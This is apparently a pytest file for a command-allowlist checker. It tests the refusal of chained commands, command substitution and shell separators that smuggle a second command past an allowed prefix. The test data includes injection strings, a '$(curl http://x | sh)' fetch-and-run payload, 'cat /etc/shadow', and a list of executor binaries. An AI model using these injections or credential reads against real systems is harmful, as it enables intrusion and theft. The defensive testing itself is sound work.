"""Opt-in strict checking of every segment of a chained exec command.

allowed_commands matches what a command STARTS with, and the matched string
then goes to `bash -lc`. So `allowed-probe; id` passes -- it starts with an
allowed prefix -- and the shell runs both halves. Reported by an operator who
demonstrated it with ';', '&&' and '|'.

Refusing compound operators outright was measured against 48 hours of fleet
traffic: it would reject every chained call, 87,281 of them across more than a
thousand hosts, including `cd /srv/app && make`. A fix reverted within the hour
protects nobody, so this is opt-in and checks each segment instead.
"""

from __future__ import annotations

import dataclasses

import pytest

from sentinelx_core.policy import Policy
from sentinelx_core.segment_check import (
    POSITION_FREE,
    READ_ONLY_FILTERS,
    has_substitution,
    split_top_level,
    unauthorised_segment,
)

PROBE = "/usr/local/bin/project-capacity-probe"


def _policy(*allowed: str) -> Policy:
    return dataclasses.replace(Policy.empty(), allowed_commands=tuple(allowed))


# --- the reported attack ----------------------------------------------------

@pytest.mark.parametrize("sep", [";", "&&", "||", "|"])
def test_an_allowed_prefix_cannot_carry_a_second_command(sep):
    cmd = f"{PROBE} {sep} /usr/bin/id"
    assert unauthorised_segment(_policy(PROBE), cmd) == "/usr/bin/id"


def test_the_bare_allowed_command_still_passes():
    assert unauthorised_segment(_policy(PROBE), PROBE) is None


def test_arguments_to_an_allowed_command_still_pass():
    assert unauthorised_segment(_policy(PROBE), f"{PROBE} --json --verbose") is None


# --- the concessions that keep it usable ------------------------------------

def test_cd_is_allowed_anywhere():
    """90% of what strict checking rejected was `cd /path && <allowed>`."""
    assert unauthorised_segment(_policy(PROBE), f"cd /srv/app && {PROBE}") is None


def test_cd_does_not_excuse_what_follows_it():
    assert unauthorised_segment(_policy(PROBE), "cd /srv && /usr/bin/id") == "/usr/bin/id"


def test_a_read_only_filter_is_allowed_after_a_pipe():
    assert unauthorised_segment(_policy(PROBE), f"{PROBE} | head -20") is None


def test_several_filters_chain_fine():
    cmd = f"{PROBE} | grep x | sort | uniq | wc -l"
    assert unauthorised_segment(_policy(PROBE), cmd) is None


def test_a_filter_is_NOT_allowed_as_the_first_segment():
    """`cat /etc/shadow` reads a file; `| cat` cannot reach one on its own."""
    assert unauthorised_segment(_policy(PROBE), "cat /etc/shadow") == "cat /etc/shadow"


def test_a_non_filter_after_a_pipe_is_still_refused():
    assert unauthorised_segment(_policy(PROBE), f"{PROBE} | /usr/bin/id") == "/usr/bin/id"


# --- command substitution: the gap our own verification found ---------------

@pytest.mark.parametrize("cmd", [
    f"{PROBE} $(id)",
    f"{PROBE} `id`",
    f'{PROBE} "$(id)"',
    f"{PROBE} $(curl http://x | sh)",
])
def test_substitution_is_refused(cmd):
    """One segment, allowed prefix, every part passes -- and the shell runs it."""
    assert has_substitution(cmd) is not None


@pytest.mark.parametrize("cmd", [
    f"{PROBE} 'a literal $(not a substitution)'",
    f"{PROBE} --msg 'literal `backticks` here'",
])
def test_single_quotes_are_not_substitution(cmd):
    """The shell does not substitute inside single quotes, so neither do we."""
    assert has_substitution(cmd) is None


def test_double_quotes_do_not_protect_a_substitution():
    assert has_substitution(f'{PROBE} "{"$(id)"}"') is not None


def test_a_plain_command_has_no_substitution():
    assert has_substitution(f"{PROBE} | head -20") is None


# --- splitting ---------------------------------------------------------------

def test_a_separator_inside_quotes_is_data_not_structure():
    """A naive split reported a false 100% breakage when this was measured."""
    assert split_top_level("find . -name '*.py;' -print") == ["find . -name '*.py;' -print"]


def test_an_escaped_separator_does_not_split():
    assert len(split_top_level(r"echo a\; b")) == 1


def test_empty_segments_are_dropped():
    assert split_top_level(f"{PROBE} ;; ") == [PROBE]


# --- the switch itself -------------------------------------------------------

def test_strict_is_off_by_default():
    assert Policy.empty().exec_strict is False


def test_it_is_read_from_the_config(tmp_path):
    cfg = tmp_path / "config.yaml"
    cfg.write_text("allowed_commands: [ls]\nexec_strict: true\n")
    assert Policy.from_file(cfg).exec_strict is True


def test_the_key_is_not_reported_as_unknown(tmp_path, caplog):
    cfg = tmp_path / "config.yaml"
    cfg.write_text("allowed_commands: [ls]\nexec_strict: true\n")
    with caplog.at_level("WARNING"):
        Policy.from_file(cfg)
    assert "exec_strict" not in caplog.text


def test_the_filter_set_holds_no_executor():
    """A filter that can run something else would defeat the position rule."""
    for dangerous in ("sh", "bash", "python", "python3", "perl", "ruby", "xargs", "env", "sudo"):
        assert dangerous not in READ_ONLY_FILTERS
        assert dangerous not in POSITION_FREE
